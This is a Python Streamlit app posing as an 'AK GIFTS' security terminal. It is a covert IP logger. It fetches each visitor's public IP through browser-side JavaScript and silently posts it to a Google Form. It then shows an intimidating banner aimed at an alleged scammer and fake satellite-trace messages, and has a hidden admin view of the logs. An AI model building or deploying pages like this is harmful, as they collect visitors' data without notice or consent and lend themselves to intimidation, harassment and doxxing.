import streamlit as st
import requests
from streamlit_javascript import st_javascript

st.set_page_config(page_title="AK GIFTS | Internal Security", layout="wide")

# --- 1. JAVASCRIPT IP FETCH (The only way to be 100% sure) ---
def get_client_ip():
    # This runs in the visitor's browser, not on the server
    url = 'https://api64.ipify.org?format=json'
    script = f'await fetch("{url}").then(r => r.json())'
    result = st_javascript(script)
    
    if isinstance(result, dict) and 'ip' in result:
        return result['ip']
    return None

user_ip = get_client_ip()

# --- 2. LOGGING TO GOOGLE SHEET ---
FORM_ID = "1FAIpQLSeL-8OqJ1WEUlBsTBcr_LVOJrngK-eHmRsSi7ufcfva10UHcA"
ENTRY_ID = "entry.444157392"

if user_ip and "logged_final" not in st.session_state:
    try:
        url = f"https://docs.google.com/forms/d/e/{FORM_ID}/formResponse"
        requests.post(url, data={ENTRY_ID: user_ip})
        st.session_state["logged_final"] = True
    except:
        pass

# --- 3. UI DASHBOARD ---
st.title("🎁 AK GIFTS | SECURITY TERMINAL")
st.markdown("""
    <div style="color: #ff4b4b; font-size: 26px; font-weight: bold; border: 3px solid red; padding: 20px; text-align: center; background: #111;">
    ⚠️ YOUR SCAM HAVE BEEN COMING TO AN END BE SAFE MAN
    </div>
    """, unsafe_allow_html=True)

st.divider()

if user_ip:
    st.metric("VERIFIED PUBLIC IP", user_ip)
    st.success("Target Location Uplink: ESTABLISHED")
else:
    st.info("🔄 Synchronizing Satellite Trace... Please wait.")

# --- 4. ADMIN VIEW ---
if st.query_params.get("admin") == "true":
    st.divider()
    st.subheader("🕵️ ENKODER MASTER LOGS")
    st.write(f"Current visitor IP: **{user_ip}**")
    st.info("Check your Google Sheet responses. If you are using a VPN, the VPN's IP will appear there.")
